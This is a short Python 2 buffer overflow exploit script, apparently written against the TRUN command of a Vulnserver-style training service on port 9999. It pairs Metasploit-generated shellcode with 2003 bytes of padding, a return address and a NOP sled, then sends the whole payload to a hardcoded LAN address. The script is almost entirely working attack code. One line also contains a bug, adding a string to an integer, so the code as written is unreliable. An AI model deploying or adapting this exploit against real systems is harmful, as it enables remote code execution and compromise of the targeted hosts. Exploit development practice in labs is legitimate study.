#!/usr/bin/python
 
import sys, socket                                                                     # import modules to call ip and port

overflow = (
"\xda\xd5\xbd\x5b\x1e\x92\x7a\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\xb4\xe2\x70\x8f\xb6\xf3\xf7"
"\x70\x46\x04\x98\xf9\xa3\x35\x98\x9e\xa0\x66\x28\xd4\xe4\x8a"
"\xc3\xb8\x1c\x18\xa1\x14\x13\xa9\x0c\x43\x1a\x2a\x3c\xb7\x3d"
"\xa8\x3f\xe4\x9d\x91\x8f\xf9\xdc\xd6\xf2\xf0\x8c\x8f\x79\xa6"
"\x20\xbb\x34\x7b\xcb\xf7\xd9\xfb\x28\x4f\xdb\x2a\xff\xdb\x82"
"\xec\xfe\x08\xbf\xa4\x18\x4c\xfa\x7f\x93\xa6\x70\x7e\x75\xf7"
"\x79\x2d\xb8\x37\x88\x2f\xfd\xf0\x73\x5a\xf7\x02\x09\x5d\xcc"
"\x79\xd5\xe8\xd6\xda\x9e\x4b\x32\xda\x73\x0d\xb1\xd0\x38\x59"
"\x9d\xf4\xbf\x8e\x96\x01\x4b\x31\x78\x80\x0f\x16\x5c\xc8\xd4"
"\x37\xc5\xb4\xbb\x48\x15\x17\x63\xed\x5e\xba\x70\x9c\x3d\xd3"
"\xb5\xad\xbd\x23\xd2\xa6\xce\x11\x7d\x1d\x58\x1a\xf6\xbb\x9f"
"\x5d\x2d\x7b\x0f\xa0\xce\x7c\x06\x67\x9a\x2c\x30\x4e\xa3\xa6"
"\xc0\x6f\x76\x68\x90\xdf\x29\xc9\x40\xa0\x99\xa1\x8a\x2f\xc5"
"\xd2\xb5\xe5\x6e\x78\x4c\x6e\x51\xd5\x4f\x6a\x39\x24\x4f\x63"
"\xe5\xa1\xa9\xe9\x05\xe4\x62\x86\xbc\xad\xf8\x37\x40\x78\x85"
"\x78\xca\x8f\x7a\x36\x3b\xe5\x68\xaf\xcb\xb0\xd2\x66\xd3\x6e"
"\x7a\xe4\x46\xf5\x7a\x63\x7b\xa2\x2d\x24\x4d\xbb\xbb\xd8\xf4"
"\x15\xd9\x20\x60\x5d\x59\xff\x51\x60\x60\x72\xed\x46\x72\x4a"
"\xee\xc2\x26\x02\xb9\x9c\x90\xe4\x13\x6f\x4a\xbf\xc8\x39\x1a"
"\x46\x23\xfa\x5c\x47\x6e\x8c\x80\xf6\xc7\xc9\xbf\x37\x80\xdd"
"\xb8\x25\x30\x21\x13\xee\x50\xc0\xb1\x1b\xf9\x5d\x50\xa6\x64"
"\x5e\x8f\xe5\x90\xdd\x25\x96\x66\xfd\x4c\x93\x23\xb9\xbd\xe9"
"\x3c\x2c\xc1\x5e\x3c\x65")                                                      # overflow bytes exploit from metasploit framework

shellcode= "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" + 32 + overflow

  
try:
         
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                    # connect socket to ip and port
        s.connect(('192.168.1.12',9999))
         
        s.send(('TRUN /.:/' + shellcode))                                        # payload sent
        s.close()                                                                # socket closed
        
except:
        print "error connecting to server"    
        sys.exit()
